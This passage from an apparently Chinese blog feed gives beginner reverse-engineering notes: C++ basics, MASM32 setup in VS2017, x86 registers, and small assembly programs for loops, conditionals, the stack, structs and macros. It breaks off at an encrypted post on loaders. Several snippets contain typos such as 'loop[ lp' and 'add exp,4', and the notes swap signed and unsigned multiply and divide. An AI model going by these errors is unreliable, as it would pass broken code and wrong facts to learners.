class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-comment">//命名空间</span><br><span class="hljs-keyword">namespace</span> MyName &#123;<br><span class="hljs-type">const</span> <span class="hljs-type">float</span> pi&#123; <span class="hljs-number">3.14</span> &#125;;<br>&#125;<br><br><span class="hljs-comment">//全局声明</span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> MyName;<br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>cout &lt;&lt; pi &lt;&lt; endl;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><strong>面向对象</strong></li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyClass</span><br>&#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">volume</span><span class="hljs-params">()</span> </span>&#123;<br><span class="hljs-keyword">return</span> Length * width * heigth;<br>&#125;<br><br><span class="hljs-keyword">private</span>:<br><span class="hljs-type">int</span> Length&#123; <span class="hljs-number">5</span> &#125;;<br><span class="hljs-type">int</span> width&#123; <span class="hljs-number">6</span> &#125;;<br><span class="hljs-type">int</span> heigth&#123; <span class="hljs-number">8</span> &#125;;<br>&#125;;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br><span class="hljs-comment">//创建类对象</span><br>MyClass my;<br>std::cout &lt;&lt; my.<span class="hljs-built_in">volume</span>() &lt;&lt; std::endl;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="汇编"><a href="#汇编" class="headerlink" title="汇编"></a>汇编</h2><ul><li><p><strong>用vs2017创建汇编程序项目</strong></p><p><img src="/2022/06/20/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%80/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%80/image-20240107152902863.png" alt="image-20240107152902863"></p><p><img src="/2022/06/20/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%80/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%80/image-20240107153046814.png" alt="image-20240107153046814"></p><p><img src="/2022/06/20/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%80/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%80/image-20240107153059392.png" alt="image-20240107153059392"></p><p>点击确定</p><p><img src="/2022/06/20/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%80/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%80/image-20240107153131982.png" alt="image-20240107153131982"></p><p><img src="/2022/06/20/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%80/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%80/image-20240107153144389.png" alt="image-20240107153144389"></p><p>然后点击应用 确定</p></li></ul><p>下载msam32 <a href="http://www.masm32.com/">http://www.masm32.com/</a></p><p><img src="/2022/06/20/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%80/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%80/image-20240107153154388.png" alt="image-20240107153154388"></p><p><img src="/2022/06/20/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%80/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%80/image-20240107153204880.png" alt="image-20240107153204880"></p><p><img src="/2022/06/20/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%80/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%80/image-20240107153213868.png" alt="image-20240107153213868">添加新建项  改后缀为.asm，就可以编写汇编语言了</p><p>hello word汇编程序</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs bash">INCLUDELIB kernel32.lib<br>INCLUDELIB user32.lib<br> <br>.386<br>.model flat,stdcall<br> <br>MessageBoxA PROTO,<br>hwnd:DWORD,<br>lpText:DWORD,<br>lpCaption:DWORD,<br>uType:DWORD<br> <br>ExitProcess PROTO,<br>dwExitCode:DWORD<br> <br>.data<br>msg byte <span class="hljs-string">&#x27;Hello,Assembly!&#x27;</span><br> <br>.code<br>main Proc<br>mov eax,offset msg<br>push 0h<br>push 0h<br>push eax<br>push 0h<br>call MessageBoxA<br>push 0h<br>call ExitProcess<br>main endp<br>end main<br></code></pre></td></tr></table></figure><p><img src="/2022/06/20/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%80/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%80/image-20240107153223180.png" alt="image-20240107153223180"></p><p>这里记录一个坑点，我本来得用的vs2019但是搭建汇编环境死活有问题，最后换了vs2017一配置立马ok</p><ul><li><strong>三类： 通用寄存器、专用寄存器、段寄存器</strong></li></ul><p>1.通用寄存器<br>数据寄存器:ax、bx、cx、dx<br>ax:作为累加器使用，是算术运算的主要寄存器<br>bx:可以作为通用寄存器，此外在计算储存地址时，它经常用作基址寄存器<br>cx:可以作为通用寄存器，此外在循环和串处理指令中作隐含的计数器<br>dx:可以作为通用寄存器，在作双字长运算时用来存放高位字</p><p>2.专用寄存器<br>IP:为指令指针寄存器，用来存放代码段中的偏移地址，在程序运行过程中，它始终指向下一条指令的首地址，它与cs寄存器联用确定下一条指令的物理地址<br>SP:为堆栈指针寄存器<br>PSW:程序状态字寄存器。由条件码标志、控制标志和系统标志构成</p><p>3.段寄存器<br>代码段CS:存放当前正在运行的程序<br>数据段DS:存放当前运行程序所用的数据<br>段栈段SS:定义来堆栈的所在区域。堆栈一种数据结构，它开辟了一个比较特殊的存储区，并以后进先出的方式来访问这一区域<br>附加段ES:是附加的数据段，它是一个辅助的数据区，也是串处理指令的目的操作数存放区</p><p>数据类型<br><img src="/2022/06/20/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%80/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%80/image-20240107153248590.png" alt="image-20240107153248590"><br><img src="/2022/06/20/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%80/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%80/image-20240107153258793.png" alt="image-20240107153258793"></p><ul><li><strong>offset</strong></li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-number">.586</span><br>.MODEL flat,stdcall<br>option casemap:none<br><br>include windows.inc<br>include user32.inc<br>include kernel32.inc<br>includelib user32.lib<br>includelib kernel32.lib<br>.data<br>szStr db <span class="hljs-string">&quot;my name is iDea&quot;</span>,<span class="hljs-number">0</span><br>num dword <span class="hljs-number">5</span><br>arrNum DWORD <span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span><br>var1 db ?<br>.code<br>main proc<br>mov eax,offset arrNum + <span class="hljs-number">4</span><br>mov eax,[eax]<br>mov eax,<span class="hljs-number">7</span><br>add ebx,<span class="hljs-number">6</span><br>sub eax,ebx<br>call ExitProcess<br>add esp,<span class="hljs-number">4</span><br>main ENDP<br>END main<br></code></pre></td></tr></table></figure><ul><li><strong>jmp和loop</strong><br>jmp<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-number">.586</span><br>.MODEL flat,stdcall<br>option casemap:none<br><br>include windows.inc<br>include user32.inc<br>include kernel32.inc<br>includelib user32.lib<br>includelib kernel32.lib<br>.data<br><br>.code<br>main proc<br><span class="hljs-keyword">xor</span> eax,eax<br>lp:<br>inc eax<br>jmp lp ;跳转到lp处继续执行<br>push <span class="hljs-number">0</span><br>call ExitProcess<br>add esp,<span class="hljs-number">4</span><br>main ENDP<br>END main<br></code></pre></td></tr></table></figure>loop<br>可以规定循环次数<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-number">.586</span><br>.MODEL flat,stdcall<br>option casemap:none<br><br>include windows.inc<br>include user32.inc<br>include kernel32.inc<br>includelib user32.lib<br>includelib kernel32.lib<br>.data<br><br>.code<br>main proc<br><span class="hljs-keyword">xor</span> eax,eax<br>mov ecx,<span class="hljs-number">10</span> ;规定执行的次数<br>lp:<br>inc eax<br>loop[ lp ;跳转到lp处继续执行<br>push <span class="hljs-number">0</span><br>call ExitProcess<br>add esp,<span class="hljs-number">4</span><br>main ENDP<br>END main<br></code></pre></td></tr></table></figure>复制字符串</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-number">.586</span><br>.MODEL flat,stdcall<br>option casemap:none<br><br>include windows.inc<br>include user32.inc<br>include kernel32.inc<br>includelib user32.lib<br>includelib kernel32.lib<br>.data<br>source byte <span class="hljs-string">&quot;my name is iDea&quot;</span>,<span class="hljs-number">0</span><br><span class="hljs-function">target byte <span class="hljs-keyword">sizeof</span> source <span class="hljs-title">dup</span><span class="hljs-params">(<span class="hljs-number">0</span>)</span></span><br><span class="hljs-function">.code</span><br><span class="hljs-function">main proc</span><br><span class="hljs-function">mov esi,0</span><br><span class="hljs-function">mov ecx,<span class="hljs-keyword">sizeof</span> source</span><br><span class="hljs-function">lp:</span><br><span class="hljs-function">mov al,source[esi]</span><br><span class="hljs-function">mov target[esi],al</span><br><span class="hljs-function">inc esi</span><br><span class="hljs-function">loop lp</span><br><span class="hljs-function">push <span class="hljs-number">0</span></span><br><span class="hljs-function">call ExitProcess</span><br><span class="hljs-function">add esp,<span class="hljs-number">4</span></span><br><span class="hljs-function">main ENDP</span><br><span class="hljs-function">END main</span><br><span class="hljs-function"></span><br></code></pre></td></tr></table></figure><p>-<strong>栈、堆操作</strong><br>栈 ：<br>先进后出</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-number">.586</span><br>.MODEL flat,stdcall<br>option casemap:none<br><br>include windows.inc<br>include user32.inc<br>include kernel32.inc<br>includelib user32.lib<br>includelib kernel32.lib<br>.data<br>source byte <span class="hljs-string">&quot;my name is iDea&quot;</span>,<span class="hljs-number">0</span><br>sourcesize=($-source)<span class="hljs-number">-1</span> ;获取source字符串长度<br>.code<br>main proc<br>mov ecx,sourcesize<br>mov esi,<span class="hljs-number">0</span><br>l1:<br>movzx eax,source[esi]<br>push eax<br>inc esi  ;inc 对指定操着数+<span class="hljs-number">1</span>处理<br>loop l1<br>mov ecx,sourcesize<br>mov esi,<span class="hljs-number">0</span><br>l2:<br>pop eax<br>mov source[esi],al<br>inc esi<br>loop l2<br>push <span class="hljs-number">0</span><br>call ExitProcess<br>add esp,<span class="hljs-number">4</span><br>main ENDP<br>END main<br></code></pre></td></tr></table></figure><ul><li><strong>定义函数</strong></li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs cpp">addx proc uses esi ecx  ;定义函数<br>add esi,ecx<br>mov eax,esi<br>ret  ;返回值<br>addx endp<br><br>main proc<br>mov esi,<span class="hljs-number">5</span><br>mov ecx,<span class="hljs-number">6</span><br>push esi<br>push ecx<br>call addx<br>INVOKE ExitProcess, <span class="hljs-number">0</span><br>main ENDP<br></code></pre></td></tr></table></figure><ul><li><strong>循环</strong></li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs cpp">main proc<br>mov eax,o1<br>mov eax,o2<br>jnz L1 ;如果相等就向下执行，如果不相等就指定L1处<br>mov x,<span class="hljs-number">1</span><br>mov y,<span class="hljs-number">1</span><br>L1:<br>push <span class="hljs-number">0</span><br>call  ExitProcess<br>add exp,<span class="hljs-number">4</span><br>main ENDP<br>END main<br></code></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs cpp">main proc<br>mov eax,o1<br>mov eax,o2<br>jnz L1<br>mov x,<span class="hljs-number">1</span><br>mov y,<span class="hljs-number">1</span><br>jmp L2 ;执行完跳转到l2处<br>L1:<br>mov x,<span class="hljs-number">2</span><br>mov y,<span class="hljs-number">2</span><br>L2:<br>push <span class="hljs-number">0</span><br>call  ExitProcess<br>add exp,<span class="hljs-number">4</span><br>main ENDP<br>END main<br></code></pre></td></tr></table></figure><ul><li><strong>条件控制</strong><br>if<figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs objectivec"><span class="hljs-number">.586</span><br>.MODEL flat,stdcall<br>option casemap:none<br><br>include windows.inc<br>include user32.inc<br>include kernel32.inc<br>includelib user32.lib<br>includelib kernel32.lib<br>.data<br>i dword <span class="hljs-number">100</span><br>.code<br>main proc<br>mov eax,<span class="hljs-number">101</span><br>.if eax &gt; i <br>inc eax<br>.endif ;<span class="hljs-keyword">if</span>条件结束标志<br>push <span class="hljs-number">0</span><br>call ExitProcess<br>add esp,<span class="hljs-number">4</span><br>main ENDP<br>END main<br></code></pre></td></tr></table></figure>if-else</li></ul><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs objectivec"><span class="hljs-number">.586</span><br>.MODEL flat,stdcall<br>option casemap:none<br><br>include windows.inc<br>include user32.inc<br>include kernel32.inc<br>includelib user32.lib<br>includelib kernel32.lib<br>.data<br>i dword <span class="hljs-number">100</span><br>.code<br>main proc<br>mov eax,<span class="hljs-number">101</span><br>.if eax &gt; i <br>inc eax<br>.else<br>dec eax<br>.endif ;条件结束标志<br>push <span class="hljs-number">0</span><br>call ExitProcess<br>add esp,<span class="hljs-number">4</span><br>main ENDP<br>END main<br></code></pre></td></tr></table></figure><p>if-elseif-else</p><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs objectivec"><span class="hljs-number">.586</span><br>.MODEL flat,stdcall<br>option casemap:none<br><br>include windows.inc<br>include user32.inc<br>include kernel32.inc<br>includelib user32.lib<br>includelib kernel32.lib<br>.data<br>i dword <span class="hljs-number">100</span><br>.code<br>main proc<br>mov eax,<span class="hljs-number">101</span><br>.if eax &gt; i <br>inc eax<br>.elseif eax &lt; i<br>add eax,<span class="hljs-number">2</span><br>.else<br>dec eax<br>.endif<br>push <span class="hljs-number">0</span><br>call ExitProcess<br>add esp,<span class="hljs-number">4</span><br>main ENDP<br>END main<br></code></pre></td></tr></table></figure><p>while</p><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs objectivec"><span class="hljs-number">.586</span><br>.MODEL flat,stdcall<br>option casemap:none<br><br>include windows.inc<br>include user32.inc<br>include kernel32.inc<br>includelib user32.lib<br>includelib kernel32.lib<br>.data<br>i dword <span class="hljs-number">102</span><br>.code<br>main proc<br>mov eax,<span class="hljs-number">101</span><br>.while eax &lt; i  <br>inc eax<br>.endw ;条件结束标志<br>push <span class="hljs-number">0</span><br>call ExitProcess<br>add esp,<span class="hljs-number">4</span><br>main ENDP<br>END main<br></code></pre></td></tr></table></figure><p>do..while</p><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs objectivec"><span class="hljs-number">.586</span><br>.MODEL flat,stdcall<br>option casemap:none<br><br>include windows.inc<br>include user32.inc<br>include kernel32.inc<br>includelib user32.lib<br>includelib kernel32.lib<br>.data<br>i dword <span class="hljs-number">100</span><br>.code<br>main proc<br>mov eax,<span class="hljs-number">101</span><br>.repeat<br>inc eax<br>.until eax &gt; <span class="hljs-number">105</span><br>push <span class="hljs-number">0</span><br>call ExitProcess<br>add esp,<span class="hljs-number">4</span><br>main ENDP<br>END main<br></code></pre></td></tr></table></figure><ul><li><strong>乘法</strong></li></ul><p>有符号  mul  div<br>无符号  imul  idiv</p><p>乘数bl bx ebx<br>被乘数 al ax eax</p><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs objectivec">main proc<br>mov al,<span class="hljs-number">5</span>h<br>mov bl,<span class="hljs-number">10</span>h<br>mul bl<br>push <span class="hljs-number">0</span><br>call ExitProcess<br>add esp,<span class="hljs-number">4</span><br>main ENDP<br></code></pre></td></tr></table></figure><ul><li><strong>结构与宏</strong><br>结构体：</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-number">.586</span><br>.MODEL flat,stdcall<br>option casemap:none<br><br>include windows.inc<br>include user32.inc<br>include kernel32.inc<br>includelib user32.lib<br>includelib kernel32.lib<br><br>iDea <span class="hljs-keyword">struct</span>  ;声明结构体<br>sd1 dword ?<br>sd2 dword ?<br>iDea ends<br><br>.data<br>myiDea iDea &lt;&gt;<br>.code<br><br>main proc<br>mov myiDea.sd1,<span class="hljs-number">1</span><br>mov eax,myiDea.sd1<br>push <span class="hljs-number">0</span><br>call ExitProcess<br>add esp,<span class="hljs-number">4</span><br>main ENDP<br>END main<br></code></pre></td></tr></table></figure><p>宏:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-number">.586</span><br>.MODEL flat,stdcall<br>option casemap:none<br><br>include windows.inc<br>include user32.inc<br>include kernel32.inc<br>includelib user32.lib<br>includelib kernel32.lib<br><br>iDea macro <span class="hljs-type">char</span>;定义宏<br>mov eax,<span class="hljs-type">char</span><br>endm<br><br>main proc<br>iDea <span class="hljs-number">9</span><br>mov eax,eax<br>push <span class="hljs-number">0</span><br>call ExitProcess<br>add esp,<span class="hljs-number">4</span><br>main ENDP<br>END main<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>逆向</category>
      
    </categories>
    
    
    <tags>
      
      <tag>逆向</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>各类Loader</title>
    <link href="/2022/06/16/%E5%90%84%E7%B1%BBLoader/index/"/>
    <url>/2022/06/16/%E5%90%84%E7%B1%BBLoader/index/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉，您输入的密码错误，请检查后重新输入。" data-whm="抱歉, 当前文章不能被校验, 不过您还是可以看看解密后的内容。">  <script id="hbeData" type="hbeData" data-hmacdigest="8b335ca099cd5607b5004c1e79bc1c9fce531b1c48a9c9c4758bbae20bc64ba7">098d9f64412ee3ba7b7422d539a1fc87cc2092e8d9074162a80643d89eddf60013115d65614a6568d17d6f88f2594f3a478fe0b4dac706c74d4b7fbd51bfb10d5fbd9ca00ff591291b729a7bd16d22609968139c99d1032446d61207cf59a5e3f6348d9db9294f494d375ae67039ec6f5e2f77dd71f3f52026444793fed42d6ddcbb35e7455fa4bef461324530846bde179bd02215f7026427740f9d6de54d5ca73cde645e8199230fb3dcbd52ab7a08287793f50b109bf3db260012bf30e4056603ff7316ec155b024ef8c896f93135b98495fdfcf35dae7fbae086571e4494326c435372f94419cf2dcdf2f3f1c5a41d928feb3a18b1f7df6185cf5f523ec3986c004ccb6031198b67059888e7b9026486b0256512e1e899284189666439395af58be4b971adec0234c57e4b70bdf998c7c95b67f98f4c4bb369b5be849212b1db5c5a16b8a570f298a4790ecf2ecf689eafac03139037d5244627596ef6518ca250884b4a2c65fb68a0652d389ecb76682b5232ed0ef8466b068d932de135dcce5b47ea7ee323f0d58d6f3b92b51ecef6a89693972fef4159a8e2d0b31946ce64eae2aa9054cc15a1a1980bf1703ec7db221c1ffefa3e0f2726177e67fbd05840cfc2e4c7ba2c825a37e4d4b91bd7c6c9d35ca2f766bd15e1c867b19b9cba8c9c575da044b91ce06705524a